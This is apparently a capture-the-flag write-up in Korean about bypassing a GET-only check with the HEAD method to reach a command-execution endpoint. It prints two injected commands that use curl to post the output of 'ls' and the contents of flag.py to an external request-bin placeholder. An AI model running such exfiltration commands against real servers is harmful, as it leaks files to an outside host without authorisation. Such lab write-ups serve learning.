## 주요 개념

- Http Method

## 풀이

주어진 소스코드를 보면 GET 요청이 아닐 경우에만 cmd를 실행한다.  
/로 OPTIONS 요청을 보내보면 Allow: GET, OPTIONS, HEAD인 것을 알 수 있다.

HEAD method를 통해 os 명령어를 사용할 수 있음을 알았다.
cmd에 curl 요청을 보내도록 명령어를 담아보낸다.
먼저 해당 경로에 있는 파일 목록을 알아내기 위해 ls 명령어의 결과물을 body에 담아 보내도록 했다.
해당 경로에 flag.py가 있는 것을 확인한 후, 해당 파일의 내용물을 body에 담아 요청을 보내도록 하여 flag를 얻어냈다.

`'curl -X POST -d "$(ls)" {REQUEST_BIN}'`  
`'curl -X POST -d "$(cat flag.py)" {REQUEST_BIN}'`
